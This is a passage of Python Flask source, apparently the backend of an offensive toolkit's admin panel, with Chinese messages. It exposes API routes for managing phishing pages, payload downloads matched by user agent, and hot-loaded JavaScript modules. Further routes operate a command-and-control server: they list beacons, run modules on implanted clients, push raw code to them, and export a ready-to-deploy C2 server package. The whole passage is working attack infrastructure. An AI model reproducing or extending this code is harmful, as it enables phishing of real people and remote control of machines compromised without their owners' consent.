            file = str(request.args.get("path", "") or "").strip()
            ok, msg = phishing_bridge.delete_page_file(name, file)
            if ok:
                _ph_audit(app.config["get_redis"](), f"page file delete {name}/{file}", msg)
            return jsonify({"ok": ok, "message": msg})
        if request.method == "GET":
            file = str(request.args.get("path", "") or "").strip()
            content = phishing_bridge.read_page_file(name, file)
            if content is None:
                return jsonify({"ok": False, "error": "文件不存在或类型不允许"}), 404
            return jsonify({"ok": True, "path": file, "content": content})
        data = request.get_json(silent=True) or {}
        file = str(data.get("path", "") or "").strip()
        content = str(data.get("content", "") or "")
        ok, msg = phishing_bridge.write_page_file(name, file, content)
        if ok:
            _ph_audit(app.config["get_redis"](), f"page write {name}/{file}", msg)
        return jsonify({"ok": ok, "message": msg})

    @app.route("/api/phishing/page/create", methods=["POST"])
    @login_required
    def phishing_page_create():
        if not _ensure_phishing():
            return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
        data = request.get_json(silent=True) or {}
        name = str(data.get("name", "") or "").strip()
        desc = str(data.get("desc", "") or "").strip()
        ok, msg = phishing_bridge.create_page(name, desc)
        _ph_audit(app.config["get_redis"](), f"page create {name}", msg)
        return jsonify({"ok": ok, "message": msg})

    @app.route("/api/phishing/page/<name>", methods=["DELETE"])
    @login_required
    def phishing_page_delete(name: str):
        if not _ensure_phishing():
            return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
        ok, msg = phishing_bridge.delete_page(name)
        _ph_audit(app.config["get_redis"](), f"page delete {name}", msg)
        return jsonify({"ok": ok, "message": msg})

    # ── 下载物管理(name ↔ path/url + UA 匹配)──

    @app.route("/api/phishing/downloads")
    @login_required
    def phishing_downloads():
        if not _ensure_phishing():
            return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
        return jsonify(phishing_bridge.list_downloads())

    @app.route("/api/phishing/downloads", methods=["POST"])
    @login_required
    def phishing_downloads_save():
        if not _ensure_phishing():
            return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
        data = request.get_json(silent=True) or {}
        dls = data.get("downloads") or []
        res = phishing_bridge.save_downloads(dls)
        if res.get("ok"):
            _ph_audit(app.config["get_redis"](),
                      f"downloads save {len(dls)} 条", res.get("message", ""))
        return jsonify(res)

    # ── 共享下载目录文件(所有页面共用)──

    @app.route("/api/phishing/downloads/files")
    @login_required
    def phishing_download_files():
        if not _ensure_phishing():
            return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
        return jsonify(phishing_bridge.list_download_files())

    @app.route("/api/phishing/downloads/files", methods=["POST"])
    @login_required
    def phishing_download_files_upload():
        if not _ensure_phishing():
            return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
        data = request.get_json(silent=True) or {}
        filename = str(data.get("filename", "") or "").strip()
        content = str(data.get("content", "") or "")
        res = phishing_bridge.write_download_file(filename, content)
        if res.get("ok"):
            _ph_audit(app.config["get_redis"](),
                      f"downloads upload {filename}", res.get("message", ""))
        return jsonify(res)

    @app.route("/api/phishing/downloads/files", methods=["DELETE"])
    @login_required
    def phishing_download_files_delete():
        if not _ensure_phishing():
            return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
        filename = str(request.args.get("filename", "") or "").strip()
        res = phishing_bridge.delete_download_file(filename)
        if res.get("ok"):
            _ph_audit(app.config["get_redis"](),
                      f"downloads delete {filename}", res.get("message", ""))
        return jsonify(res)

    @app.route("/api/phishing/module/add", methods=["POST"])
    @login_required
    def phishing_module_add():
        if not _ensure_phishing():
            return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
        data = request.get_json(silent=True) or {}
        filename = str(data.get("filename", "") or "").strip()
        content = str(data.get("content", "") or "")
        if not filename.endswith(".js"):
            return jsonify({"ok": False, "error": "只允许 .js 模块文件"}), 400
        if "// MODULE =" not in content:
            return jsonify({"ok": False, "error": "模块内容必须包含 // MODULE = {...} 元数据头"}), 400
        srv = phishing_bridge.get_phishing()
        modules_dir = srv._loader._modules_dir if srv else None
        if not modules_dir:
            return jsonify({"ok": False, "error": "phishing 未启动"}), 400
        path = os.path.join(modules_dir, filename)
        try:
            with open(path, "w", encoding="utf-8") as f:
                f.write(content)
            srv._loader.reload()
        except OSError as exc:
            return jsonify({"ok": False, "error": f"写入失败: {exc}"}), 400
        _ph_audit(app.config["get_redis"](), f"module add {filename}", "ok")
        return jsonify({"ok": True, "message": f"模块 {filename} 已写入并热加载"})

    @app.route("/api/phishing/module/<filename>", methods=["DELETE"])
    @login_required
    def phishing_module_delete(filename: str):
        if not _ensure_phishing():
            return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
        if not filename.endswith(".js"):
            return jsonify({"ok": False, "error": "只允许删除 .js 模块文件"}), 400
        srv = phishing_bridge.get_phishing()
        modules_dir = srv._loader._modules_dir if srv else None
        if not modules_dir:
            return jsonify({"ok": False, "error": "phishing 未启动"}), 400
        path = os.path.join(modules_dir, filename)
        if not os.path.isfile(path):
            return jsonify({"ok": False, "error": f"模块 {filename} 不存在"}), 404
        try:
            os.remove(path)
            srv._loader.reload()
        except OSError as exc:
            return jsonify({"ok": False, "error": f"删除失败: {exc}"}), 400
        _ph_audit(app.config["get_redis"](), f"module delete {filename}", "ok")
        return jsonify({"ok": True, "message": f"模块 {filename} 已删除并热生效"})

    @app.route("/api/phishing/start", methods=["POST"])
    @login_required
    def phishing_start():
        if not _ensure_phishing():
            return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
        ok, msg = phishing_bridge.start()
        _ph_audit(app.config["get_redis"](), "start", msg)
        return jsonify({"ok": ok, "message": msg})

    @app.route("/api/phishing/stop", methods=["POST"])
    @login_required
    def phishing_stop():
        if not _ensure_phishing():
            return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
        ok, msg = phishing_bridge.stop()
        _ph_audit(app.config["get_redis"](), "stop", msg)
        return jsonify({"ok": ok, "message": msg})

    @app.route("/api/phishing/restart", methods=["POST"])
    @login_required
    def phishing_restart():
        if not _ensure_phishing():
            return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
        ok, msg = phishing_bridge.restart()
        _ph_audit(app.config["get_redis"](), "restart", msg)
        return jsonify({"ok": ok, "message": msg})

    @app.route("/api/phishing/config", methods=["POST"])
    @login_required
    def phishing_config():
        if not _ensure_phishing():
            return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
        data = request.get_json(silent=True) or {}
        ok, msg = phishing_bridge.update_config(data)
        _ph_audit(app.config["get_redis"](), f"config {json.dumps(data)[:200]}", msg)
        return jsonify({"ok": ok, "message": msg})

    @app.route("/api/phishing/reports")
    @login_required
    def phishing_reports():
        if not _ensure_phishing():
            return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
        limit = min(int(request.args.get("limit", "100") or 100), 500)
        reports = phishing_bridge.list_reports(limit)
        return jsonify({"ok": True, "count": len(reports), "reports": reports})

    @app.route("/api/phishing/reports/clear", methods=["POST"])
    @login_required
    def phishing_reports_clear():
        if not _ensure_phishing():
            return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
        ok, msg = phishing_bridge.clear_reports()
        _ph_audit(app.config["get_redis"](), "reports clear", msg)
        return jsonify({"ok": ok, "message": msg})

    @app.route("/api/phishing/audit")
    @login_required
    def phishing_audit():
        redis = app.config["get_redis"]()
        limit = min(int(request.args.get("limit", "100") or 100), 500)
        raw = redis.conn.lrange("fs3:phishing:audit", 0, limit - 1)
        entries = []
        for x in raw:
            try:
                entries.append(json.loads(x))
            except Exception:
                continue
        return jsonify({"ok": True, "count": len(entries), "audit": entries})

    # ══════════ C2 远程模式（client 连接远端独立 server） ══════════

    @app.route("/api/c2/remote/status")
    @login_required
    def c2_remote_status():
        st = c2_remote.status()
        st["ok"] = True
        return jsonify(st)

    @app.route("/api/c2/remote/connect", methods=["POST"])
    @login_required
    def c2_remote_connect():
        data = request.get_json(silent=True) or {}
        url = str(data.get("url") or "").strip()
        key = str(data.get("key") or "").strip()
        if not url:
            return jsonify({"ok": False, "error": "请输入远端地址(host:port)"}), 400
        ok, msg = c2_remote.connect(url, key)
        _c2_audit(app.config["get_redis"](), f"remote connect {url}", msg)
        return jsonify({"ok": ok, "message": msg}), (200 if ok else 400)

    @app.route("/api/c2/remote/disconnect", methods=["POST"])
    @login_required
    def c2_remote_disconnect():
        ok, msg = c2_remote.disconnect()
        _c2_audit(app.config["get_redis"](), "remote disconnect", msg)
        return jsonify({"ok": ok, "message": msg})

    @app.route("/api/c2/remote/command", methods=["POST"])
    @login_required
    def c2_remote_command():
        data = request.get_json(silent=True) or {}
        line = str(data.get("line") or "").strip()
        if not line:
            return jsonify({"ok": False, "error": "命令为空"}), 400
        ok, out = c2_remote.command(line)
        _c2_audit(app.config["get_redis"](), f"remote cmd {line[:200]}", out[:200])
        return jsonify({"ok": ok, "output": out}), (200 if ok else 400)

    @app.route("/api/c2/remote/beacons")
    @login_required
    def c2_remote_beacons():
        ok, out = c2_remote.list_beacons()
        if not ok:
            return jsonify({"ok": False, "error": out}), 400
        return jsonify({"ok": True, "beacons": out})

    @app.route("/api/c2/remote/beacon/<client_id>")
    @login_required
    def c2_remote_beacon_detail(client_id):
        ok, out = c2_remote.beacon_detail(client_id)
        if not ok:
            return jsonify({"ok": False, "error": out}), 400
        return jsonify({"ok": True, "detail": out})

    @app.route("/api/c2/remote/modules")
    @login_required
    def c2_remote_modules():
        ok, out = c2_remote.list_modules()
        if not ok:
            return jsonify({"ok": False, "error": out}), 400
        return jsonify({"ok": True, "modules": out})

    @app.route("/api/c2/remote/exec", methods=["POST"])
    @login_required
    def c2_remote_exec():
        data = request.get_json(silent=True) or {}
        client_id = str(data.get("client_id") or "")
        name = str(data.get("name") or "")
        args = data.get("args") or []
        if not isinstance(args, list):
            args = [str(args)]
        args = [str(a) for a in args]
        ok, out = c2_remote.exec_module(client_id, name, args)
        _c2_audit(app.config["get_redis"](),
                  f"remote exec {name} {args} -> {client_id}", out[:200])
        return jsonify({"ok": ok, "output": out}), (200 if ok else 400)

    @app.route("/api/c2/remote/raw", methods=["POST"])
    @login_required
    def c2_remote_raw():
        data = request.get_json(silent=True) or {}
        client_id = str(data.get("client_id") or "")
        code = str(data.get("code") or "")
        if not code:
            return jsonify({"ok": False, "error": "代码为空"}), 400
        ok, out = c2_remote.push_raw(client_id, code)
        _c2_audit(app.config["get_redis"](), f"remote raw -> {client_id}",
                  out[:200])
        return jsonify({"ok": ok, "output": out}), (200 if ok else 400)

    # ══════════ C2 一键导出配置（独立 server 部署包） ══════════

    @app.route("/api/c2/export-config")
    @login_required
    def c2_export_config():
        """导出独立可部署的 C2 server 配置包(zip): 代码 + config.json +
        README + start.sh。在另一台服务器解压后 python3 server.py 即可启动,
        本界面可用远程模式(client_url + client_key)连接管理。"""
        import io
        import zipfile
        config = load_yaml(app.config["CONFIG_PATH"])
        c2cfg = _c2_config(config)
        root = c2cfg.get("project_root") or ""
        if not root or not os.path.isdir(root):
            return jsonify({"ok": False,
                            "error": "c2 project_root 不存在,请检查 config.yaml"}), 400
        cfg_file = os.path.join(root, c2cfg.get("config_file") or "config.json")
        # client_key 未生成则自动生成(远端 client 连接需要)
        try:
            with open(cfg_file, encoding="utf-8") as f:
                srv_cfg = json.load(f)
        except Exception:
            srv_cfg = {}
        if not srv_cfg.get("client_key") and c2_bridge.c2_running():
            okk, msg = c2_bridge.generate_client_key()
            if okk:
                try:
                    with open(cfg_file, encoding="utf-8") as f:
                        srv_cfg = json.load(f)
                except Exception:
                    pass
        client_key = srv_cfg.get("client_key") or ""
        client_port = srv_cfg.get("client_port") or 65504
        server_port = srv_cfg.get("server_port") or 65503
        implant_key = srv_cfg.get("implant_key") or ""
        host = srv_cfg.get("server_host") or "0.0.0.0"

        readme = _export_readme(host, server_port, client_port, client_key)
        start_sh = _export_start_sh()

        buf = io.BytesIO()
        skip_dirs = {"__pycache__", ".git", "data"}
        skip_files = {"events.jsonl", "server.log", "console.log"}
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            for dirpath, dirnames, filenames in os.walk(root):
                dirnames[:] = [d for d in dirnames if d not in skip_dirs]
                rel = os.path.relpath(dirpath, root)
                for fn in filenames:
                    if fn in skip_files or fn.endswith(".log"):
                        continue
                    full = os.path.join(dirpath, fn)
                    arc = os.path.join("c2_server", rel, fn) if rel != "." \
                        else os.path.join("c2_server", fn)
                    try:
                        zf.write(full, arc)
                    except OSError:
                        continue
            zf.writestr("c2_server/README.md", readme)
            zf.writestr("c2_server/start.sh", start_sh)
        buf.seek(0)
        _c2_audit(app.config["get_redis"](), "export-config",
                  f"zip {len(buf.getvalue())} bytes")
        return Response(buf.getvalue(), mimetype="application/zip",
                        headers={"Content-Disposition":
                                 "attachment; filename=c2_server_export.zip"})
